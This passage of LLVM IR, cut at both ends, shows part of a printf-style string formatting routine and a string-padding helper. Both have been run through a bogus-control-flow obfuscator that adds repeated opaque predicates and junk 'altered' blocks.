  br i1 %518, label %originalBBpart2105, label %originalBB103alteredBB

originalBBpart2105:                               ; preds = %originalBB103
  br label %519

; <label>:519:                                    ; preds = %originalBBpart2105, %originalBBpart2101
  %520 = phi i32* [ %488, %originalBBpart2101 ], [ %509, %originalBBpart2105 ]
  %521 = load i32, i32* %520, align 4
  %522 = load i32, i32* %7, align 4
  %523 = load i32, i32* %8, align 4
  %524 = call i32 @printi(i8** %463, i32 %521, i32 10, i32 0, i32 %522, i32 %523, i32 97)
  %525 = load i32, i32* %9, align 4
  %526 = add nsw i32 %525, %524
  store i32 %526, i32* %9, align 4
  br label %635

; <label>:527:                                    ; preds = %originalBBpart290
  %528 = load i32, i32* @x.7
  %529 = load i32, i32* @y.8
  %530 = sub i32 %528, 1
  %531 = mul i32 %528, %530
  %532 = urem i32 %531, 2
  %533 = icmp eq i32 %532, 0
  %534 = icmp slt i32 %529, 10
  %535 = or i1 %533, %534
  br i1 %535, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %527
  %536 = load i8*, i8** %5, align 8
  %537 = load i8, i8* %536, align 1
  %538 = zext i8 %537 to i32
  %539 = icmp eq i32 %538, 99
  %540 = load i32, i32* @x.7
  %541 = load i32, i32* @y.8
  %542 = sub i32 %540, 1
  %543 = mul i32 %540, %542
  %544 = urem i32 %543, 2
  %545 = icmp eq i32 %544, 0
  %546 = icmp slt i32 %541, 10
  %547 = or i1 %545, %546
  br i1 %547, label %originalBBpart2109, label %originalBB107alteredBB

originalBBpart2109:                               ; preds = %originalBB107
  br i1 %539, label %548, label %609

; <label>:548:                                    ; preds = %originalBBpart2109
  %549 = load i32, i32* @x.7
  %550 = load i32, i32* @y.8
  %551 = sub i32 %549, 1
  %552 = mul i32 %549, %551
  %553 = urem i32 %552, 2
  %554 = icmp eq i32 %553, 0
  %555 = icmp slt i32 %550, 10
  %556 = or i1 %554, %555
  br i1 %556, label %originalBB111, label %originalBB111alteredBB

originalBB111:                                    ; preds = %originalBB111alteredBB, %548
  %557 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %558 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %557, i32 0, i32 0
  %559 = load i32, i32* %558, align 8
  %560 = icmp ule i32 %559, 40
  %561 = load i32, i32* @x.7
  %562 = load i32, i32* @y.8
  %563 = sub i32 %561, 1
  %564 = mul i32 %561, %563
  %565 = urem i32 %564, 2
  %566 = icmp eq i32 %565, 0
  %567 = icmp slt i32 %562, 10
  %568 = or i1 %566, %567
  br i1 %568, label %originalBBpart2113, label %originalBB111alteredBB

originalBBpart2113:                               ; preds = %originalBB111
  br i1 %560, label %569, label %591

; <label>:569:                                    ; preds = %originalBBpart2113
  %570 = load i32, i32* @x.7
  %571 = load i32, i32* @y.8
  %572 = sub i32 %570, 1
  %573 = mul i32 %570, %572
  %574 = urem i32 %573, 2
  %575 = icmp eq i32 %574, 0
  %576 = icmp slt i32 %571, 10
  %577 = or i1 %575, %576
  br i1 %577, label %originalBB115, label %originalBB115alteredBB

originalBB115:                                    ; preds = %originalBB115alteredBB, %569
  %578 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %557, i32 0, i32 3
  %579 = load i8*, i8** %578, align 8
  %580 = getelementptr i8, i8* %579, i32 %559
  %581 = bitcast i8* %580 to i32*
  %582 = add i32 %559, 8
  store i32 %582, i32* %558, align 8
  %583 = load i32, i32* @x.7
  %584 = load i32, i32* @y.8
  %585 = sub i32 %583, 1
  %586 = mul i32 %583, %585
  %587 = urem i32 %586, 2
  %588 = icmp eq i32 %587, 0
  %589 = icmp slt i32 %584, 10
  %590 = or i1 %588, %589
  br i1 %590, label %originalBBpart2133, label %originalBB115alteredBB

originalBBpart2133:                               ; preds = %originalBB115
  br label %596

; <label>:591:                                    ; preds = %originalBBpart2113
  %592 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %557, i32 0, i32 2
  %593 = load i8*, i8** %592, align 8
  %594 = bitcast i8* %593 to i32*
  %595 = getelementptr i8, i8* %593, i32 8
  store i8* %595, i8** %592, align 8
  br label %596

; <label>:596:                                    ; preds = %591, %originalBBpart2133
  %597 = phi i32* [ %581, %originalBBpart2133 ], [ %594, %591 ]
  %598 = load i32, i32* %597, align 4
  %599 = trunc i32 %598 to i8
  %600 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %599, i8* %600, align 1
  %601 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %601, align 1
  %602 = load i8**, i8*** %4, align 8
  %603 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %604 = load i32, i32* %7, align 4
  %605 = load i32, i32* %8, align 4
  %606 = call i32 @prints(i8** %602, i8* %603, i32 %604, i32 %605)
  %607 = load i32, i32* %9, align 4
  %608 = add nsw i32 %607, %606
  store i32 %608, i32* %9, align 4
  br label %635

; <label>:609:                                    ; preds = %originalBBpart2109
  %610 = load i32, i32* @x.7
  %611 = load i32, i32* @y.8
  %612 = sub i32 %610, 1
  %613 = mul i32 %610, %612
  %614 = urem i32 %613, 2
  %615 = icmp eq i32 %614, 0
  %616 = icmp slt i32 %611, 10
  %617 = or i1 %615, %616
  br i1 %617, label %originalBB135, label %originalBB135alteredBB

originalBB135:                                    ; preds = %originalBB135alteredBB, %609
  %618 = load i32, i32* @x.7
  %619 = load i32, i32* @y.8
  %620 = sub i32 %618, 1
  %621 = mul i32 %618, %620
  %622 = urem i32 %621, 2
  %623 = icmp eq i32 %622, 0
  %624 = icmp slt i32 %619, 10
  %625 = or i1 %623, %624
  br i1 %625, label %originalBBpart2137, label %originalBB135alteredBB

originalBBpart2137:                               ; preds = %originalBB135
  br label %634

; <label>:626:                                    ; preds = %17
  br label %627

; <label>:627:                                    ; preds = %626, %51
  %628 = load i8**, i8*** %4, align 8
  %629 = load i8*, i8** %5, align 8
  %630 = load i8, i8* %629, align 1
  %631 = zext i8 %630 to i32
  call void @printchar(i8** %628, i32 %631)
  %632 = load i32, i32* %9, align 4
  %633 = add nsw i32 %632, 1
  store i32 %633, i32* %9, align 4
  br label %634

; <label>:634:                                    ; preds = %627, %originalBBpart2137
  br label %635

; <label>:635:                                    ; preds = %634, %596, %519, %originalBBpart286, %347, %originalBBpart251, %192
  %636 = load i32, i32* @x.7
  %637 = load i32, i32* @y.8
  %638 = sub i32 %636, 1
  %639 = mul i32 %636, %638
  %640 = urem i32 %639, 2
  %641 = icmp eq i32 %640, 0
  %642 = icmp slt i32 %637, 10
  %643 = or i1 %641, %642
  br i1 %643, label %originalBB139, label %originalBB139alteredBB

originalBB139:                                    ; preds = %originalBB139alteredBB, %635
  %644 = load i8*, i8** %5, align 8
  %645 = getelementptr inbounds i8, i8* %644, i32 1
  store i8* %645, i8** %5, align 8
  %646 = load i32, i32* @x.7
  %647 = load i32, i32* @y.8
  %648 = sub i32 %646, 1
  %649 = mul i32 %646, %648
  %650 = urem i32 %649, 2
  %651 = icmp eq i32 %650, 0
  %652 = icmp slt i32 %647, 10
  %653 = or i1 %651, %652
  br i1 %653, label %originalBBpart2141, label %originalBB139alteredBB

originalBBpart2141:                               ; preds = %originalBB139
  br label %12

; <label>:654:                                    ; preds = %originalBBpart2, %12
  %655 = load i8**, i8*** %4, align 8
  %656 = icmp ne i8** %655, null
  br i1 %656, label %657, label %660

; <label>:657:                                    ; preds = %654
  %658 = load i8**, i8*** %4, align 8
  %659 = load i8*, i8** %658, align 8
  store i8 0, i8* %659, align 1
  br label %660

; <label>:660:                                    ; preds = %657, %654
  %661 = load i32, i32* @x.7
  %662 = load i32, i32* @y.8
  %663 = sub i32 %661, 1
  %664 = mul i32 %661, %663
  %665 = urem i32 %664, 2
  %666 = icmp eq i32 %665, 0
  %667 = icmp slt i32 %662, 10
  %668 = or i1 %666, %667
  br i1 %668, label %originalBB143, label %originalBB143alteredBB

originalBB143:                                    ; preds = %originalBB143alteredBB, %660
  %669 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %670 = bitcast %struct.__va_list_tag* %669 to i8*
  call void @llvm.va_end(i8* %670)
  %671 = load i32, i32* %9, align 4
  %672 = load i32, i32* @x.7
  %673 = load i32, i32* @y.8
  %674 = sub i32 %672, 1
  %675 = mul i32 %672, %674
  %676 = urem i32 %675, 2
  %677 = icmp eq i32 %676, 0
  %678 = icmp slt i32 %673, 10
  %679 = or i1 %677, %678
  br i1 %679, label %originalBBpart2145, label %originalBB143alteredBB

originalBBpart2145:                               ; preds = %originalBB143
  ret i32 %671

originalBBalteredBB:                              ; preds = %originalBB, %29
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  %680 = load i8*, i8** %5, align 8
  %681 = load i8, i8* %680, align 1
  %682 = zext i8 %681 to i32
  %683 = icmp eq i32 %682, 45
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %100
  %684 = load i32, i32* %7, align 4
  %685 = mul nsw i32 %684, 10
  store i32 %685, i32* %7, align 4
  %686 = load i8*, i8** %5, align 8
  %687 = load i8, i8* %686, align 1
  %688 = zext i8 %687 to i32
  %_ = sub i32 0, %688
  %gen = add i32 %_, 48
  %_7 = sub i32 0, %688
  %gen8 = add i32 %_7, 48
  %689 = sub nsw i32 %688, 48
  %690 = load i32, i32* %7, align 4
  %691 = add nsw i32 %690, %689
  store i32 %691, i32* %7, align 4
  br label %originalBB6

originalBB12alteredBB:                            ; preds = %originalBB12, %138
  %692 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %134, i32 0, i32 3
  %693 = load i8*, i8** %692, align 8
  %694 = getelementptr i8, i8* %693, i32 %136
  %695 = bitcast i8* %694 to i32*
  %_13 = sub i32 %136, 8
  %gen14 = mul i32 %_13, 8
  %_15 = shl i32 %136, 8
  %_16 = shl i32 %136, 8
  %_17 = shl i32 %136, 8
  %696 = add i32 %136, 8
  store i32 %696, i32* %135, align 8
  br label %originalBB12

originalBB21alteredBB:                            ; preds = %originalBB21, %173
  %697 = load i8*, i8** %11, align 8
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %199
  %698 = load i8*, i8** %5, align 8
  %699 = load i8, i8* %698, align 1
  %700 = zext i8 %699 to i32
  %701 = icmp eq i32 %700, 100
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %220
  %702 = load i8**, i8*** %4, align 8
  %703 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %704 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %703, i32 0, i32 0
  %705 = load i32, i32* %704, align 8
  %706 = icmp ule i32 %705, 40
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %242
  %707 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %230, i32 0, i32 3
  %708 = load i8*, i8** %707, align 8
  %709 = getelementptr i8, i8* %708, i32 %232
  %710 = bitcast i8* %709 to i32*
  %_34 = sub i32 0, %232
  %gen35 = add i32 %_34, 8
  %_36 = sub i32 %232, 8
  %gen37 = mul i32 %_36, 8
  %_38 = sub i32 0, %232
  %gen39 = add i32 %_38, 8
  %_40 = sub i32 0, %232
  %gen41 = add i32 %_40, 8
  %_42 = sub i32 %232, 8
  %gen43 = mul i32 %_42, 8
  %711 = add i32 %232, 8
  store i32 %711, i32* %231, align 8
  br label %originalBB33

originalBB47alteredBB:                            ; preds = %originalBB47, %269
  %712 = load i32, i32* %270, align 4
  %713 = load i32, i32* %7, align 4
  %714 = load i32, i32* %8, align 4
  %715 = call i32 @printi(i8** %229, i32 %712, i32 10, i32 1, i32 %713, i32 %714, i32 97)
  %716 = load i32, i32* %9, align 4
  %_48 = sub i32 %716, %715
  %gen49 = mul i32 %_48, %715
  %717 = add nsw i32 %716, %715
  store i32 %717, i32* %9, align 4
  br label %originalBB47

originalBB53alteredBB:                            ; preds = %originalBB53, %298
  %718 = load i8**, i8*** %4, align 8
  %719 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %720 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %719, i32 0, i32 0
  %721 = load i32, i32* %720, align 8
  %722 = icmp ule i32 %721, 40
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %320
  %723 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %308, i32 0, i32 3
  %724 = load i8*, i8** %723, align 8
  %725 = getelementptr i8, i8* %724, i32 %310
  %726 = bitcast i8* %725 to i32*
  %_58 = sub i32 %310, 8
  %gen59 = mul i32 %_58, 8
  %_60 = shl i32 %310, 8
  %_61 = sub i32 %310, 8
  %gen62 = mul i32 %_61, 8
  %_63 = sub i32 %310, 8
  %gen64 = mul i32 %_63, 8
  %_65 = sub i32 %310, 8
  %gen66 = mul i32 %_65, 8
  %_67 = shl i32 %310, 8
  %_68 = shl i32 %310, 8
  %_69 = sub i32 %310, 8
  %gen70 = mul i32 %_69, 8
  %727 = add i32 %310, 8
  store i32 %727, i32* %309, align 8
  br label %originalBB57

originalBB74alteredBB:                            ; preds = %originalBB74, %355
  %728 = load i8*, i8** %5, align 8
  %729 = load i8, i8* %728, align 1
  %730 = zext i8 %729 to i32
  %731 = icmp eq i32 %730, 88
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %376
  %732 = load i8**, i8*** %4, align 8
  %733 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %734 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %733, i32 0, i32 0
  %735 = load i32, i32* %734, align 8
  %736 = icmp ule i32 %735, 40
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %409
  %737 = load i32, i32* %410, align 4
  %738 = load i32, i32* %7, align 4
  %739 = load i32, i32* %8, align 4
  %740 = call i32 @printi(i8** %385, i32 %737, i32 16, i32 0, i32 %738, i32 %739, i32 65)
  %741 = load i32, i32* %9, align 4
  %_83 = sub i32 0, %741
  %gen84 = add i32 %_83, %740
  %742 = add nsw i32 %741, %740
  store i32 %742, i32* %9, align 4
  br label %originalBB82

originalBB88alteredBB:                            ; preds = %originalBB88, %433
  %743 = load i8*, i8** %5, align 8
  %744 = load i8, i8* %743, align 1
  %745 = zext i8 %744 to i32
  %746 = icmp eq i32 %745, 117
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %454
  %747 = load i8**, i8*** %4, align 8
  %748 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %749 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %748, i32 0, i32 0
  %750 = load i32, i32* %749, align 8
  %751 = icmp ule i32 %750, 40
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %476
  %752 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %464, i32 0, i32 3
  %753 = load i8*, i8** %752, align 8
  %754 = getelementptr i8, i8* %753, i32 %466
  %755 = bitcast i8* %754 to i32*
  %_97 = sub i32 %466, 8
  %gen98 = mul i32 %_97, 8
  %_99 = shl i32 %466, 8
  %756 = add i32 %466, 8
  store i32 %756, i32* %465, align 8
  br label %originalBB96

originalBB103alteredBB:                           ; preds = %originalBB103, %498
  %757 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %464, i32 0, i32 2
  %758 = load i8*, i8** %757, align 8
  %759 = bitcast i8* %758 to i32*
  %760 = getelementptr i8, i8* %758, i32 8
  store i8* %760, i8** %757, align 8
  br label %originalBB103

originalBB107alteredBB:                           ; preds = %originalBB107, %527
  %761 = load i8*, i8** %5, align 8
  %762 = load i8, i8* %761, align 1
  %763 = zext i8 %762 to i32
  %764 = icmp eq i32 %763, 99
  br label %originalBB107

originalBB111alteredBB:                           ; preds = %originalBB111, %548
  %765 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %766 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %765, i32 0, i32 0
  %767 = load i32, i32* %766, align 8
  %768 = icmp ule i32 %767, 40
  br label %originalBB111

originalBB115alteredBB:                           ; preds = %originalBB115, %569
  %769 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %557, i32 0, i32 3
  %770 = load i8*, i8** %769, align 8
  %771 = getelementptr i8, i8* %770, i32 %559
  %772 = bitcast i8* %771 to i32*
  %_116 = sub i32 %559, 8
  %gen117 = mul i32 %_116, 8
  %_118 = sub i32 %559, 8
  %gen119 = mul i32 %_118, 8
  %_120 = sub i32 0, %559
  %gen121 = add i32 %_120, 8
  %_122 = sub i32 %559, 8
  %gen123 = mul i32 %_122, 8
  %_124 = shl i32 %559, 8
  %_125 = sub i32 %559, 8
  %gen126 = mul i32 %_125, 8
  %_127 = shl i32 %559, 8
  %_128 = sub i32 0, %559
  %gen129 = add i32 %_128, 8
  %_130 = sub i32 %559, 8
  %gen131 = mul i32 %_130, 8
  %773 = add i32 %559, 8
  store i32 %773, i32* %558, align 8
  br label %originalBB115

originalBB135alteredBB:                           ; preds = %originalBB135, %609
  br label %originalBB135

originalBB139alteredBB:                           ; preds = %originalBB139, %635
  %774 = load i8*, i8** %5, align 8
  %775 = getelementptr inbounds i8, i8* %774, i32 1
  store i8* %775, i8** %5, align 8
  br label %originalBB139

originalBB143alteredBB:                           ; preds = %originalBB143, %660
  %776 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %777 = bitcast %struct.__va_list_tag* %776 to i8*
  call void @llvm.va_end(i8* %777)
  %778 = load i32, i32* %9, align 4
  br label %originalBB143
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = load i32, i32* @x.9
  %6 = load i32, i32* @y.10
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8**, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  store i8** %0, i8*** %13, align 8
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  store i32 %3, i32* %16, align 4
  store i32 0, i32* %17, align 4
  store i32 32, i32* %18, align 4
  %21 = load i32, i32* %15, align 4
  %22 = icmp sgt i32 %21, 0
  %23 = load i32, i32* @x.9
  %24 = load i32, i32* @y.10
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %122

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = load i32, i32* @x.9
  %33 = load i32, i32* @y.10
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  store i32 0, i32* %19, align 4
  %40 = load i8*, i8** %14, align 8
  store i8* %40, i8** %20, align 8
  %41 = load i32, i32* @x.9
  %42 = load i32, i32* @y.10
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %49

; <label>:49:                                     ; preds = %72, %originalBBpart24
  %50 = load i32, i32* @x.9
  %51 = load i32, i32* @y.10
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %49
  %58 = load i8*, i8** %20, align 8
  %59 = load i8, i8* %58, align 1
  %60 = icmp ne i8 %59, 0
  %61 = load i32, i32* @x.9
  %62 = load i32, i32* @y.10
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %60, label %69, label %75

; <label>:69:                                     ; preds = %originalBBpart28
  %70 = load i32, i32* %19, align 4
  %71 = add nsw i32 %70, 1
  store i32 %71, i32* %19, align 4
  br label %72

; <label>:72:                                     ; preds = %69
  %73 = load i8*, i8** %20, align 8
  %74 = getelementptr inbounds i8, i8* %73, i32 1
  store i8* %74, i8** %20, align 8
  br label %49

; <label>:75:                                     ; preds = %originalBBpart28
  %76 = load i32, i32* %19, align 4
  %77 = load i32, i32* %15, align 4
  %78 = icmp sge i32 %76, %77
  br i1 %78, label %79, label %96

; <label>:79:                                     ; preds = %75
  %80 = load i32, i32* @x.9
  %81 = load i32, i32* @y.10
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %79
  store i32 0, i32* %15, align 4
  %88 = load i32, i32* @x.9
  %89 = load i32, i32* @y.10
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %116

; <label>:96:                                     ; preds = %75
  %97 = load i32, i32* @x.9
  %98 = load i32, i32* @y.10
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %96
  %105 = load i32, i32* %19, align 4
  %106 = load i32, i32* %15, align 4
  %107 = sub nsw i32 %106, %105
  store i32 %107, i32* %15, align 4
  %108 = load i32, i32* @x.9
  %109 = load i32, i32* @y.10
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %116

; <label>:116:                                    ; preds = %originalBBpart216, %originalBBpart212
  %117 = load i32, i32* %16, align 4
  %118 = and i32 %117, 2
  %119 = icmp ne i32 %118, 0
  br i1 %119, label %120, label %121

; <label>:120:                                    ; preds = %116
  store i32 48, i32* %18, align 4
  br label %121

; <label>:121:                                    ; preds = %120, %116
  br label %122

; <label>:122:                                    ; preds = %121, %originalBBpart2
  %123 = load i32, i32* %16, align 4
  %124 = and i32 %123, 1
  %125 = icmp ne i32 %124, 0
  br i1 %125, label %171, label %126

; <label>:126:                                    ; preds = %122
  br label %127

; <label>:127:                                    ; preds = %originalBBpart235, %126
  %128 = load i32, i32* %15, align 4
  %129 = icmp sgt i32 %128, 0
  br i1 %129, label %130, label %170

; <label>:130:                                    ; preds = %127
  %131 = load i32, i32* @x.9
  %132 = load i32, i32* @y.10
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %130
  %139 = load i8**, i8*** %13, align 8
  %140 = load i32, i32* %18, align 4
  call void @printchar(i8** %139, i32 %140)
  %141 = load i32, i32* %17, align 4
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %17, align 4
  %143 = load i32, i32* @x.9
  %144 = load i32, i32* @y.10
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart225, label %originalBB18alteredBB

originalBBpart225:                                ; preds = %originalBB18
  br label %151

; <label>:151:                                    ; preds = %originalBBpart225
  %152 = load i32, i32* @x.9
  %153 = load i32, i32* @y.10
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %151
  %160 = load i32, i32* %15, align 4
  %161 = add nsw i32 %160, -1
  store i32 %161, i32* %15, align 4
  %162 = load i32, i32* @x.9
  %163 = load i32, i32* @y.10
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart235, label %originalBB27alteredBB

originalBBpart235:                                ; preds = %originalBB27
  br label %127

; <label>:170:                                    ; preds = %127
  br label %171

; <label>:171:                                    ; preds = %170, %122
  br label %172

; <label>:172:                                    ; preds = %originalBBpart255, %171
  %173 = load i32, i32* @x.9
  %174 = load i32, i32* @y.10
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %172
  %181 = load i8*, i8** %14, align 8
  %182 = load i8, i8* %181, align 1
  %183 = icmp ne i8 %182, 0
  %184 = load i32, i32* @x.9
  %185 = load i32, i32* @y.10
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %183, label %192, label %234

; <label>:192:                                    ; preds = %originalBBpart239
  %193 = load i32, i32* @x.9
  %194 = load i32, i32* @y.10
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %192
  %201 = load i8**, i8*** %13, align 8
  %202 = load i8*, i8** %14, align 8
  %203 = load i8, i8* %202, align 1
  %204 = zext i8 %203 to i32
  call void @printchar(i8** %201, i32 %204)
  %205 = load i32, i32* %17, align 4
  %206 = add nsw i32 %205, 1
  store i32 %206, i32* %17, align 4
  %207 = load i32, i32* @x.9
  %208 = load i32, i32* @y.10
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBBpart251, label %originalBB41alteredBB

originalBBpart251:                                ; preds = %originalBB41
  br label %215

; <label>:215:                                    ; preds = %originalBBpart251
  %216 = load i32, i32* @x.9
  %217 = load i32, i32* @y.10
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %215
  %224 = load i8*, i8** %14, align 8
  %225 = getelementptr inbounds i8, i8* %224, i32 1
  store i8* %225, i8** %14, align 8
  %226 = load i32, i32* @x.9
  %227 = load i32, i32* @y.10
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br label %172

; <label>:234:                                    ; preds = %originalBBpart239
  %235 = load i32, i32* @x.9
  %236 = load i32, i32* @y.10
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %234
  %243 = load i32, i32* @x.9
  %244 = load i32, i32* @y.10
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
